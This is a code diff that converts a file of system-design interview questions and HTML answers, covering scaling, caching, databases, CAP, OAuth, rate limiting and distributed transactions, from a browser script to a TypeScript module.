@@ -1,16 +1,17 @@
 // Interview data: system-design, microservices, security-jwt, design-patterns, algorithms
 // Auto-generated from pv.html
-(function () {
-  (window.__pvTopics = window.__pvTopics || []).push(
-    {
-      id: 'system-design',
-      name: 'System Design',
-      icon: '🏗️',
-      questions: [
-        {
-          q: 'What is System Design and why does it matter in interviews?',
-          difficulty: 'easy',
-          a: `<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
+import type { PvTopic } from '../types';
+
+export const topics: PvTopic[] = [
+  {
+    id: 'system-design',
+    name: 'System Design',
+    icon: '🏗️',
+    questions: [
+      {
+        q: 'What is System Design and why does it matter in interviews?',
+        difficulty: 'easy',
+        a: `<p><strong>System Design</strong> is the process of defining the architecture, components, and data flow of a large-scale software system. It answers: <em>"How would you build X to handle millions of users?"</em></p>
 <p><strong>Think of it like building a city:</strong></p>
 <ul>
 <li>You need roads (networks), buildings (servers), water pipes (data flow), traffic lights (load balancers).</li>
@@ -23,11 +24,11 @@
 <li>What if one server crashes? (Redundancy)</li>
 </ul>
 <div class="key-point">In interviews, they don't expect a perfect answer — they want to see how you <strong>think through trade-offs</strong> and break a big problem into smaller pieces.</div>`,
-        },
-        {
-          q: 'What is Horizontal Scaling vs Vertical Scaling?',
-          difficulty: 'easy',
-          a: `<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
+      },
+      {
+        q: 'What is Horizontal Scaling vs Vertical Scaling?',
+        difficulty: 'easy',
+        a: `<p><strong>Vertical Scaling (Scale Up)</strong> = Make one machine more powerful (more CPU, RAM).</p>
 <p><strong>Horizontal Scaling (Scale Out)</strong> = Add more machines to share the work.</p>
 <p><strong>Restaurant analogy:</strong></p>
 <ul>
@@ -42,11 +43,11 @@ Horizontal: 1 server → 10 servers behind a load balancer</pre>
 <tr><td>Downtime</td><td>Need to restart</td><td>No downtime (add servers)</td></tr>
 <tr><td>Complexity</td><td>Simple</td><td>Need load balancer, sync</td></tr></table>
 <div class="key-point">Most real-world systems use <strong>horizontal scaling</strong> because it has no hard ceiling. Netflix, Google, Amazon all scale horizontally.</div>`,
-        },
-        {
-          q: 'What is a Load Balancer and how does it work?',
-          difficulty: 'easy',
-          a: `<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
+      },
+      {
+        q: 'What is a Load Balancer and how does it work?',
+        difficulty: 'easy',
+        a: `<p>A <strong>Load Balancer</strong> distributes incoming traffic across multiple servers so no single server gets overwhelmed.</p>
 <p><strong>Analogy:</strong> Think of a restaurant host who directs customers to different tables/waiters evenly, so no single waiter is overloaded.</p>
 <pre>         Client Requests
                |
@@ -62,11 +63,11 @@ Horizontal: 1 server → 10 servers behind a load balancer</pre>
 </ul>
 <p><strong>Example:</strong> When you visit google.com, your request hits a load balancer that routes you to one of thousands of servers — you never know which one.</p>
 <div class="key-point">Popular tools: <strong>Nginx</strong>, <strong>HAProxy</strong>, <strong>AWS ALB/ELB</strong>. Always use a load balancer when you have multiple servers.</div>`,
-        },
-        {
-          q: 'What is Caching and why is it important in system design?',
-          difficulty: 'easy',
-          a: `<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
+      },
+      {
+        q: 'What is Caching and why is it important in system design?',
+        difficulty: 'easy',
+        a: `<p><strong>Caching</strong> = storing frequently used data in a fast-access location so you don't have to fetch it from the slow source every time.</p>
 <p><strong>Analogy:</strong> Instead of going to the library every time you need a recipe, you photocopy your favorite recipes and keep them on your fridge (cache). Much faster!</p>
 <pre>Without cache:  User → Server → Database (slow, every time)
 With cache:     User → Server → Cache (fast!) → DB only if not in cache</pre>
@@ -79,11 +80,11 @@ With cache:     User → Server → Cache (fast!) → DB only if not in cache</p
 </ul>
 <p><strong>Example:</strong> Instagram caches popular user profiles in Redis. Instead of hitting the database for Cristiano Ronaldo's profile 1 million times/second, they read it from cache in <strong>&lt;1ms</strong>.</p>
 <div class="key-point">Cache is not free — you must handle <strong>cache invalidation</strong> (when the real data changes, the cache must be updated). This is one of the hardest problems in CS!</div>`,
-        },
-        {
-          q: 'What is a CDN (Content Delivery Network)?',
-          difficulty: 'easy',
-          a: `<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
+      },
+      {
+        q: 'What is a CDN (Content Delivery Network)?',
+        difficulty: 'easy',
+        a: `<p>A <strong>CDN</strong> is a network of servers distributed around the world that serve static content (images, videos, CSS, JS) from a location <strong>close to the user</strong>.</p>
 <p><strong>Analogy:</strong> Instead of one pizza shop serving the whole city, you open branches in every neighborhood. Customers get pizza faster because the shop is nearby.</p>
 <pre>Without CDN:
   User in Tokyo → Server in New York (200ms latency)
@@ -98,11 +99,11 @@ With CDN:
 </ol>
 <p><strong>Example:</strong> Netflix uses its own CDN (Open Connect) with servers in ISP data centers worldwide. When you stream a movie, the video comes from a server in your city, not from Netflix HQ.</p>
 <div class="key-point">Popular CDNs: <strong>CloudFlare</strong>, <strong>AWS CloudFront</strong>, <strong>Akamai</strong>. Use CDN for any static content to dramatically reduce latency.</div>`,
-        },
-        {
-          q: 'What is a Database Index and how does it speed up queries?',
-          difficulty: 'medium',
-          a: `<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
+      },
+      {
+        q: 'What is a Database Index and how does it speed up queries?',
+        difficulty: 'medium',
+        a: `<p>A <strong>database index</strong> is a data structure (usually B-Tree or Hash) that helps the database find rows quickly without scanning every row.</p>
 <p><strong>Analogy:</strong> Think of the index at the back of a textbook. Instead of reading the entire book to find "Photosynthesis", you look it up in the index, get the page number, and go directly there.</p>
 <pre>Without index: SELECT * FROM users WHERE email = 'john@mail.com'
   → Scans all 10 million rows (slow!)
@@ -117,11 +118,11 @@ With index on email:
 </ul>
 <p><strong>Example:</strong> An e-commerce site indexes <code>product_name</code>, <code>category</code>, and <code>price</code> columns because users search/filter by those constantly.</p>
 <div class="key-point">Rule of thumb: Index columns that appear in <code>WHERE</code>, <code>JOIN</code>, and <code>ORDER BY</code> clauses. Don't over-index — each index slows down writes.</div>`,
-        },
-        {
-          q: 'Explain SQL vs NoSQL databases. When would you choose each?',
-          difficulty: 'medium',
-          a: `<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
+      },
+      {
+        q: 'Explain SQL vs NoSQL databases. When would you choose each?',
+        difficulty: 'medium',
+        a: `<p><strong>SQL (Relational)</strong>: Structured tables with rows/columns, enforces schema, uses SQL language. E.g., MySQL, PostgreSQL.</p>
 <p><strong>NoSQL</strong>: Flexible schema, stores data as documents/key-value/graph/column. E.g., MongoDB, Redis, Cassandra.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -141,11 +142,11 @@ NoSQL (MongoDB document):
 <tr><td>Need ACID transactions (banking)</td><td>Need massive horizontal scaling</td></tr>
 <tr><td>Complex queries with JOINs</td><td>High write throughput (IoT, logs)</td></tr></table>
 <div class="key-point">Many systems use <strong>both</strong>: SQL for core data (users, payments) + NoSQL for flexible data (user activity logs, product catalogs).</div>`,
-        },
-        {
-          q: 'What is Database Sharding?',
-          difficulty: 'medium',
-          a: `<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
+      },
+      {
+        q: 'What is Database Sharding?',
+        difficulty: 'medium',
+        a: `<p><strong>Sharding</strong> = splitting a large database into smaller pieces (shards), each stored on a different server.</p>
 <p><strong>Analogy:</strong> Imagine a library with 1 million books on one shelf — finding a book is slow. Instead, split books by genre: Fiction in Room A, Science in Room B, History in Room C. Each room is a "shard".</p>
 <pre>Before sharding (1 big DB):
   All 100M users → one database server (bottleneck!)
@@ -161,11 +162,11 @@ After sharding:
 </ul>
 <p><strong>Example:</strong> Instagram shards its PostgreSQL database by user ID. Each shard handles a subset of users, allowing them to scale to billions of photos.</p>
 <div class="key-point">Sharding adds complexity: cross-shard queries are hard, rebalancing shards is painful. Only shard when a single database can't handle the load.</div>`,
-        },
-        {
-          q: 'What is Database Replication?',
-          difficulty: 'medium',
-          a: `<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
+      },
+      {
+        q: 'What is Database Replication?',
+        difficulty: 'medium',
+        a: `<p><strong>Replication</strong> = keeping copies of the same database on multiple servers.</p>
 <p><strong>Analogy:</strong> Instead of one copy of a popular book in the library, keep 5 copies. More people can read it at the same time, and if one copy is damaged, others are still available.</p>
 <pre>Master-Slave Replication:
   [Master DB] ──writes──→  [Slave 1] (read-only copy)
@@ -185,11 +186,11 @@ After sharding:
 </ul>
 <p><strong>Example:</strong> A news site gets 95% reads, 5% writes. The master handles writes, and 4 read replicas handle the flood of readers. If the master crashes, one replica is promoted within seconds.</p>
 <div class="key-point">Watch out for <strong>replication lag</strong>: a write to master may take a few milliseconds to appear on slaves. This can cause "I just updated my profile but still see the old one" bugs.</div>`,
-        },
-        {
-          q: 'What is the CAP Theorem?',
-          difficulty: 'hard',
-          a: `<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
+      },
+      {
+        q: 'What is the CAP Theorem?',
+        difficulty: 'hard',
+        a: `<p>The <strong>CAP Theorem</strong> states that a distributed system can only guarantee <strong>2 out of 3</strong> properties at the same time:</p>
 <ul>
 <li><strong>C</strong>onsistency – Every read gets the most recent write (all nodes see the same data)</li>
 <li><strong>A</strong>vailability – Every request gets a response (even if it might not be the latest data)</li>
@@ -212,11 +213,11 @@ AP systems: Cassandra, DynamoDB, CouchDB
 CA systems: Traditional single-node RDBMS (no partition tolerance)
   → Only works when there's no network partition (single machine)</pre>
 <div class="key-point">In real distributed systems, <strong>P (partition tolerance) is mandatory</strong> — networks WILL fail. So in practice, you choose between <strong>CP</strong> or <strong>AP</strong>.</div>`,
-        },
-        {
-          q: 'What is an API Gateway?',
-          difficulty: 'medium',
-          a: `<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
+      },
+      {
+        q: 'What is an API Gateway?',
+        difficulty: 'medium',
+        a: `<p>An <strong>API Gateway</strong> is a single entry point that sits between clients and your backend microservices. All requests go through it first.</p>
 <p><strong>Analogy:</strong> Think of a hotel receptionist. Guests don't walk directly to the kitchen, laundry, or housekeeping. They tell the receptionist what they need, and the receptionist routes the request to the right department.</p>
 <pre>Without API Gateway:
   Mobile App → User Service
@@ -239,11 +240,11 @@ With API Gateway:
 </ul>
 <p><strong>Example:</strong> Netflix's Zuul API Gateway handles billions of requests/day, routing them to hundreds of microservices.</p>
 <div class="key-point">Popular tools: <strong>Kong</strong>, <strong>AWS API Gateway</strong>, <strong>Nginx</strong>, <strong>Spring Cloud Gateway</strong>.</div>`,
-        },
-        {
-          q: 'What is a Message Queue and when should you use one?',
-          difficulty: 'medium',
-          a: `<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
+      },
+      {
+        q: 'What is a Message Queue and when should you use one?',
+        difficulty: 'medium',
+        a: `<p>A <strong>Message Queue</strong> is a system where producers send messages and consumers process them asynchronously. The queue holds messages until they are processed.</p>
 <p><strong>Analogy:</strong> A coffee shop. You (producer) place an order and get a receipt number. You sit down and wait. The barista (consumer) picks orders from the queue and makes coffee one by one. You don't block the line waiting for your coffee.</p>
 <pre>Synchronous (without queue):
   User → Place Order → Wait for email... → Wait for invoice... → Done (slow!)
@@ -261,11 +262,11 @@ Asynchronous (with queue):
 </ul>
 <p><strong>Example:</strong> When you upload a video to YouTube, it responds instantly with "Processing...". The actual encoding runs asynchronously via a message queue across many servers.</p>
 <div class="key-point">Popular tools: <strong>RabbitMQ</strong>, <strong>Apache Kafka</strong>, <strong>AWS SQS</strong>, <strong>Redis Streams</strong>.</div>`,
-        },
-        {
-          q: 'What is the difference between Monolith and Microservices architecture?',
-          difficulty: 'medium',
-          a: `<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
+      },
+      {
+        q: 'What is the difference between Monolith and Microservices architecture?',
+        difficulty: 'medium',
+        a: `<p><strong>Monolith</strong> = entire application is one big deployable unit.</p>
 <p><strong>Microservices</strong> = application is split into small, independent services, each doing one thing.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -286,11 +287,11 @@ Microservices:
 <tr><td>Complexity</td><td>Simple at first</td><td>Complex (networking, monitoring)</td></tr>
 <tr><td>Team size</td><td>Small teams</td><td>Large teams (each owns a service)</td></tr></table>
 <div class="key-point">Start with a monolith, then extract microservices as the system grows. Don't start with microservices for a small project — it's over-engineering.</div>`,
-        },
-        {
-          q: 'What is Rate Limiting and how do you implement it?',
-          difficulty: 'medium',
-          a: `<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
+      },
+      {
+        q: 'What is Rate Limiting and how do you implement it?',
+        difficulty: 'medium',
+        a: `<p><strong>Rate Limiting</strong> = controlling how many requests a user/client can make in a given time window.</p>
 <p><strong>Analogy:</strong> A theme park ride allows only 20 people per 5 minutes. If more people come, they wait in line. This prevents overcrowding (server overload).</p>
 <p><strong>Common algorithms:</strong></p>
 <ul>
@@ -309,11 +310,11 @@ Microservices:
   Request 12-13: ✅</pre>
 <p><strong>Example:</strong> Twitter API allows 300 tweets per 3 hours per user. GitHub API allows 5000 requests per hour per authenticated user.</p>
 <div class="key-point">Implement at the <strong>API Gateway level</strong> using Redis to track counters. Return HTTP <code>429 Too Many Requests</code> when limit is exceeded.</div>`,
-        },
-        {
-          q: 'What is Consistent Hashing and why is it used?',
-          difficulty: 'hard',
-          a: `<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
+      },
+      {
+        q: 'What is Consistent Hashing and why is it used?',
+        difficulty: 'hard',
+        a: `<p><strong>Consistent Hashing</strong> is a technique for distributing data across servers such that when a server is added or removed, only a minimal amount of data needs to move.</p>
 <p><strong>Problem with simple hashing:</strong></p>
 <pre>server = hash(key) % N   (N = number of servers)
 If N changes (add/remove server), ALMOST ALL keys get remapped! 💀</pre>
@@ -332,11 +333,11 @@ If Server B is removed → key goes to Server C (minimal disruption)</pre>
 <p><strong>Key benefit</strong>: When adding/removing a server, only <strong>K/N</strong> keys need to move (K = total keys, N = servers), instead of almost ALL keys.</p>
 <p><strong>Example:</strong> Amazon DynamoDB uses consistent hashing to distribute data across nodes. When a new node joins, only its neighbors' data is partially moved.</p>
 <div class="key-point">Used in: <strong>Memcached</strong>, <strong>DynamoDB</strong>, <strong>Cassandra</strong>, <strong>load balancers</strong>. Essential for any distributed cache or database.</div>`,
-        },
-        {
-          q: 'How would you design a URL Shortener (like bit.ly)?',
-          difficulty: 'medium',
-          a: `<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
+      },
+      {
+        q: 'How would you design a URL Shortener (like bit.ly)?',
+        difficulty: 'medium',
+        a: `<p>A URL shortener converts long URLs to short ones (e.g., <code>bit.ly/abc123</code>) and redirects users to the original URL.</p>
 <p><strong>Step-by-step design:</strong></p>
 <p><strong>1. Core flow:</strong></p>
 <pre>Create:  POST /shorten { url: "https://very-long-url.com/..." }
@@ -362,11 +363,11 @@ ID: 999999999 → Base62: "15FTGf"</pre>
 <li><strong>Rate limit</strong>: Prevent spam/abuse</li>
 </ul>
 <div class="key-point">Read-to-write ratio is ~100:1, so cache aggressively. Use <strong>301 (permanent)</strong> redirect for SEO or <strong>302 (temporary)</strong> if you want to track analytics.</div>`,
-        },
-        {
-          q: 'How would you design a Chat System (like WhatsApp/Slack)?',
-          difficulty: 'hard',
-          a: `<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
+      },
+      {
+        q: 'How would you design a Chat System (like WhatsApp/Slack)?',
+        difficulty: 'hard',
+        a: `<p>A real-time chat system requires instant message delivery, presence (online/offline), and message persistence.</p>
 <p><strong>Key components:</strong></p>
 <pre>Architecture:
   [Client] ←WebSocket→ [Chat Server] → [Message Queue] → [Chat Server] ←WebSocket→ [Client]
@@ -395,11 +396,11 @@ Status: sent → delivered → read</pre>
 </ul>
 <p><strong>Example:</strong> WhatsApp uses a custom XMPP-based protocol with Erlang servers. Each server handles millions of concurrent WebSocket connections.</p>
 <div class="key-point">Key challenge: maintaining millions of WebSocket connections. Use connection servers (stateful) separated from business logic servers (stateless).</div>`,
-        },
-        {
-          q: 'What is a Reverse Proxy?',
-          difficulty: 'easy',
-          a: `<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
+      },
+      {
+        q: 'What is a Reverse Proxy?',
+        difficulty: 'easy',
+        a: `<p>A <strong>Reverse Proxy</strong> sits between clients and servers, forwarding client requests to the appropriate backend server.</p>
 <p><strong>Analogy:</strong> You call a company's main phone number (reverse proxy). The receptionist answers and transfers you to the right department (backend server). You never dial the department directly.</p>
 <pre>Forward Proxy (protects clients):
   [Client] → [Proxy] → [Internet/Servers]
@@ -418,11 +419,11 @@ Reverse Proxy (protects servers):
 </ul>
 <p><strong>Example:</strong> Almost every website uses Nginx or Cloudflare as a reverse proxy. The client talks to Nginx, which forwards requests to your Node.js/Java app running behind it.</p>
 <div class="key-point">Nginx is the most popular reverse proxy — used by over 30% of all websites.</div>`,
-        },
-        {
-          q: 'What are WebSockets vs HTTP Long Polling vs Server-Sent Events?',
-          difficulty: 'medium',
-          a: `<p>These are three ways for a server to push data to clients in real-time:</p>
+      },
+      {
+        q: 'What are WebSockets vs HTTP Long Polling vs Server-Sent Events?',
+        difficulty: 'medium',
+        a: `<p>These are three ways for a server to push data to clients in real-time:</p>
 <p><strong>1. HTTP Long Polling:</strong></p>
 <pre>Client: "Any new data?" → Server holds connection open...
    ...waits until there IS new data...
@@ -445,11 +446,11 @@ Initial HTTP handshake → upgraded to WebSocket</pre>
 <tr><td>Overhead</td><td>High (HTTP headers)</td><td>Low</td><td>Very low</td></tr>
 <tr><td>Use case</td><td>Simple notifications</td><td>Live feeds, stocks</td><td>Chat, gaming</td></tr></table>
 <div class="key-point">Use <strong>WebSocket</strong> for bidirectional real-time (chat, games). Use <strong>SSE</strong> for one-way updates (news feed, stock prices). Use <strong>Long Polling</strong> as a fallback when WebSocket isn't available.</div>`,
-        },
-        {
-          q: 'What is the difference between REST and GraphQL?',
-          difficulty: 'medium',
-          a: `<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
+      },
+      {
+        q: 'What is the difference between REST and GraphQL?',
+        difficulty: 'medium',
+        a: `<p><strong>REST</strong>: Multiple endpoints, each returns a fixed data shape. <strong>GraphQL</strong>: One endpoint, client specifies exactly what data it wants.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
 <li><strong>REST</strong> = A restaurant with a fixed menu. You order "Combo #3" and get whatever's in it — even if you don't want the salad.</li>
@@ -476,11 +477,11 @@ GraphQL:
 <tr><td>Caching</td><td>Easy (HTTP cache)</td><td>Harder (POST requests)</td></tr>
 <tr><td>Learning curve</td><td>Simple</td><td>Steeper</td></tr></table>
 <div class="key-point">Use REST for simple CRUD APIs. Use GraphQL when you have complex, nested data or multiple clients (mobile, web) needing different data shapes.</div>`,
-        },
-        {
-          q: 'What are ACID properties in databases?',
-          difficulty: 'medium',
-          a: `<p><strong>ACID</strong> ensures database transactions are reliable:</p>
+      },
+      {
+        q: 'What are ACID properties in databases?',
+        difficulty: 'medium',
+        a: `<p><strong>ACID</strong> ensures database transactions are reliable:</p>
 <ul>
 <li><strong>A</strong>tomicity – All or nothing. If any part fails, the whole transaction rolls back.</li>
 <li><strong>C</strong>onsistency – Data goes from one valid state to another. Rules (constraints) are never broken.</li>
@@ -504,11 +505,11 @@ Durability:  After "Transfer complete", even if server crashes, the transfer is 
 <li>→ ACID rolls back inventory and payment. Nothing is half-done.</li>
 </ul>
 <div class="key-point">SQL databases (MySQL, PostgreSQL) are ACID by default. Most NoSQL databases sacrifice ACID for performance/scalability (BASE model: Basically Available, Soft state, Eventually consistent).</div>`,
-        },
-        {
-          q: 'What is Eventual Consistency?',
-          difficulty: 'medium',
-          a: `<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
+      },
+      {
+        q: 'What is Eventual Consistency?',
+        difficulty: 'medium',
+        a: `<p><strong>Eventual Consistency</strong> = after a write, all replicas will <em>eventually</em> return the latest value, but not immediately.</p>
 <p><strong>Strict Consistency</strong> = after a write, ALL reads immediately see the new value.</p>
 <p><strong>Analogy:</strong> You update your profile picture on social media.</p>
 <ul>
@@ -529,11 +530,11 @@ Durability:  After "Transfer complete", even if server crashes, the transfer is 
 <li>Shopping cart (Cassandra, DynamoDB)</li>
 </ul>
 <div class="key-point">Eventual consistency gives you <strong>higher availability and performance</strong>. Use it when "slightly stale data" is acceptable. Never use it for banking or inventory where accuracy is critical.</div>`,
-        },
-        {
-          q: 'How would you design a News Feed system (like Facebook/Twitter)?',
-          difficulty: 'hard',
-          a: `<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
+      },
+      {
+        q: 'How would you design a News Feed system (like Facebook/Twitter)?',
+        difficulty: 'hard',
+        a: `<p>A news feed shows a personalized list of posts from people you follow, ranked and ordered.</p>
 <p><strong>Two main approaches:</strong></p>
 <p><strong>1. Fan-out on Write (Push model):</strong></p>
 <pre>User A creates a post
@@ -563,11 +564,11 @@ Feed cache per user:
   user_feed:123 → [post_id_999, post_id_888, post_id_777, ...]</pre>
 <p><strong>Ranking:</strong> Sort by relevance (engagement, recency, interest) using ML models, not just chronological.</p>
 <div class="key-point">The feed cache is the core. Keep it in Redis as a sorted set of post IDs per user. Only store IDs in the feed, fetch full post content separately.</div>`,
-        },
-        {
-          q: 'What is a Circuit Breaker pattern?',
-          difficulty: 'medium',
-          a: `<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
+      },
+      {
+        q: 'What is a Circuit Breaker pattern?',
+        difficulty: 'medium',
+        a: `<p>A <strong>Circuit Breaker</strong> prevents your service from repeatedly calling a failing service. It "trips" after too many failures and returns errors immediately.</p>
 <p><strong>Analogy:</strong> Electrical circuit breaker in your house. If there's a short circuit, the breaker trips and cuts power to prevent a fire. After fixing the issue, you flip it back on.</p>
 <pre>States:
   [CLOSED] → Requests pass through normally
@@ -593,11 +594,11 @@ Order Service → Circuit Breaker → Payment Service (down!)
 <li>Half-open: Allow 3 test requests</li>
 </ul>
 <div class="key-point">Implement with <strong>Resilience4j</strong> (Java) or <strong>Hystrix</strong> (legacy). Essential in microservices to prevent cascading failures.</div>`,
-        },
-        {
-          q: 'What is Event-Driven Architecture?',
-          difficulty: 'medium',
-          a: `<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
+      },
+      {
+        q: 'What is Event-Driven Architecture?',
+        difficulty: 'medium',
+        a: `<p><strong>Event-Driven Architecture (EDA)</strong> = services communicate by producing and consuming events instead of directly calling each other.</p>
 <p><strong>Analogy:</strong> Instead of Person A calling Person B directly (phone call = synchronous), Person A posts a note on a bulletin board (event), and anyone interested reads it (asynchronous).</p>
 <pre>Traditional (synchronous):
   Order Service → calls → Payment Service → calls → Inventory Service
@@ -624,11 +625,11 @@ Event-Driven (asynchronous):
 <li>Notification Service alerts the driver</li>
 </ol>
 <div class="key-point">EDA gives you <strong>loose coupling</strong>, <strong>scalability</strong>, and <strong>resilience</strong>. But debugging is harder because there's no linear flow to follow. Use distributed tracing (Jaeger, Zipkin).</div>`,
-        },
-        {
-          q: 'What is the difference between Authentication and Authorization?',
-          difficulty: 'easy',
-          a: `<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
+      },
+      {
+        q: 'What is the difference between Authentication and Authorization?',
+        difficulty: 'easy',
+        a: `<p><strong>Authentication (AuthN)</strong> = "Who are you?" → Verifying identity (login).</p>
 <p><strong>Authorization (AuthZ)</strong> = "What can you do?" → Verifying permissions.</p>
 <p><strong>Analogy:</strong></p>
 <ul>
@@ -655,11 +656,11 @@ if (user.role === "admin") → allow DELETE /posts
 if (user.role === "editor") → allow PUT /posts
 if (user.role === "viewer") → allow GET /posts only</pre>
 <div class="key-point">Authentication always comes first. You must know WHO the user is before checking WHAT they can do.</div>`,
-        },
-        {
-          q: 'What is OAuth 2.0 and how does it work?',
-          difficulty: 'hard',
-          a: `<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
+      },
+      {
+        q: 'What is OAuth 2.0 and how does it work?',
+        difficulty: 'hard',
+        a: `<p><strong>OAuth 2.0</strong> is an authorization framework that lets a third-party app access your data without giving it your password.</p>
 <p><strong>Analogy:</strong> You want a house cleaner (App) to enter your house (Google account). Instead of giving them your house key (password), you give them a temporary access card (token) that only opens the front door (limited access) and expires after 2 hours.</p>
 <pre>OAuth 2.0 Flow (Authorization Code):
 
@@ -684,11 +685,11 @@ if (user.role === "viewer") → allow GET /posts only</pre>
 <li><strong>Refresh Token</strong>: Long-lived key to get new access tokens</li>
 </ul>
 <div class="key-point">OAuth 2.0 is for <strong>authorization</strong> (granting access), not authentication. <strong>OpenID Connect (OIDC)</strong> is built on top of OAuth 2.0 and adds authentication (proving identity).</div>`,
-        },
-        {
-          q: 'How would you design a Notification System?',
-          difficulty: 'hard',
-          a: `<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
+      },
+      {
+        q: 'How would you design a Notification System?',
+        difficulty: 'hard',
+        a: `<p>A notification system sends messages to users through multiple channels: push notifications, SMS, email, and in-app.</p>
 <pre>Architecture:
   [Any Service] → "SendNotification" event → [Notification Service]
                                                     ↓
@@ -718,11 +719,11 @@ if (user.role === "viewer") → allow GET /posts only</pre>
 <pre>If SMS fails: retry after 1s → 2s → 4s → 8s → give up</pre>
 <p><strong>Example:</strong> When your Amazon package ships, the notification system sends a push notification, an email, and an in-app message — all through different workers but triggered by one event.</p>
 <div class="key-point">Use a <strong>message queue</strong> (Kafka/SQS) to decouple notification sending. This ensures notifications are delivered even if a worker crashes — the message stays in the queue.</div>`,
-        },
-        {
-          q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
-          difficulty: 'easy',
-          a: `<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
+      },
+      {
+        q: 'What is the Single Point of Failure (SPOF) and how do you eliminate it?',
+        difficulty: 'easy',
+        a: `<p>A <strong>Single Point of Failure (SPOF)</strong> is any component whose failure would bring down the entire system.</p>
 <p><strong>Analogy:</strong> A chain is only as strong as its weakest link. If your system has one database server and it crashes, everything goes down — that's a SPOF.</p>
 <pre>SPOF Examples:
   ❌ One database server → crashes → entire app is down
@@ -743,11 +744,11 @@ Eliminating SPOFs:
 </ul>
 <p><strong>Example:</strong> Netflix runs in multiple AWS regions. If the entire US-East region goes down, traffic automatically routes to US-West. Users don't even notice.</p>
 <div class="key-point">Walk through your architecture diagram and ask: "What happens if THIS component dies?" If the answer is "everything breaks", that's a SPOF you need to address.</div>`,
-        },
-        {
-          q: 'How would you design a Rate Limiter service?',
-          difficulty: 'hard',
-          a: `<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
+      },
+      {
+        q: 'How would you design a Rate Limiter service?',
+        difficulty: 'hard',
+        a: `<p>A rate limiter service controls request traffic to protect backend services from overload and abuse.</p>
 <p><strong>Design requirements:</strong></p>
 <ul>
 <li>Low latency (must not slow down requests)</li>
@@ -791,11 +792,11 @@ X-RateLimit-Remaining: 42
 X-RateLimit-Reset: 1699001000
 HTTP 429 Too Many Requests (when limit exceeded)</pre>
 <div class="key-point">Use <strong>Redis</strong> for distributed rate limiting (fast, atomic). Run the rate limiter in the <strong>API Gateway</strong> so it protects all services uniformly.</div>`,
-        },
-        {
-          q: 'What is a Bloom Filter and when would you use it?',
-          difficulty: 'hard',
-          a: `<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
+      },
+      {
+        q: 'What is a Bloom Filter and when would you use it?',
+        difficulty: 'hard',
+        a: `<p>A <strong>Bloom Filter</strong> is a space-efficient data structure that tells you:</p>
 <ul>
 <li>"Definitely NOT in the set" → <strong>100% certain</strong></li>
 <li>"Probably in the set" → <strong>might be wrong</strong> (false positive)</li>
@@ -826,11 +827,11 @@ Checking "grape":
 <li><strong>Username availability</strong>: Fast "this username is taken" check</li>
 </ul>
 <div class="key-point">Bloom filters use <strong>very little memory</strong> compared to storing actual items. 1 billion items can be checked with ~1GB of memory and &lt;1% false positive rate.</div>`,
-        },
-        {
-          q: 'How do you handle distributed transactions across microservices?',
-          difficulty: 'hard',
-          a: `<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
+      },
+      {
+        q: 'How do you handle distributed transactions across microservices?',
+        difficulty: 'hard',
+        a: `<p>In microservices, a single business operation may span multiple services/databases. You can't use a simple database transaction because each service has its own database.</p>
 <p><strong>Problem example:</strong></p>
 <pre>Place Order:
   1. Order Service: Create order ✅
@@ -860,11 +861,11 @@ Orchestration Saga (central coordinator):
 
 (Rarely used in microservices — too slow and blocking)</pre>
 <div class="key-point">Use the <strong>Saga pattern</strong> in microservices. Choreography for simple flows, Orchestration for complex flows. Always define <strong>compensating actions</strong> (undo) for each step.</div>`,
-        },
-        {
-          q: 'What is the CQRS pattern (Command Query Responsibility Segregation)?',
-          difficulty: 'hard',
-          a: `<p><strong>CQRS</strong> = use different models for reading and writing data.</p>
+      },
+      {
